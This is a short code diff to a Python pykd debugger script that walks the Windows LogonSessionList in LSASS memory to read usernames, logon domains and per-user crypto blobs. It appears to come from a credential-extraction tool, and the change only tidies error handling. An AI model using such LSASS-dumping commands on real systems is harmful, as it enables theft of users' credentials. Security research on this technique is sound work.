@@ -24,14 +24,13 @@ users_blob = pykd.dbgCommand("!list -x \"dS @$extret+0x90;dS @$extret+0xa0\" poi
 users_pretty = users_blob.split('\n\n')
 try:
     first_user_data  = users_pretty[0] # use this index to access multiple users	
+    first_user_data_neato = first_user_data.split('\n')
+    first_username    = first_user_data_neato[0].split('  ')[1]
+    first_logondomain = first_user_data_neato[1].split('  ')[1]
 except IndexError:
     print '\n(!) User Data structure ERROR - try reloading the target debugee OS'
     sys.exit()
-
-first_user_data_neato = first_user_data.split('\n')
-first_username    = first_user_data_neato[0].split('  ')[1]
-first_logondomain = first_user_data_neato[1].split('  ')[1]
-
+    
 # retrieve crypto blob from each user
 crypto_blob = pykd.dbgCommand("!list -x \"db poi(poi(@$extret+0x108)+0x10)+0x30 L1B0\" poi(lsasrv!LogonSessionList)")
 # parse it and polish it
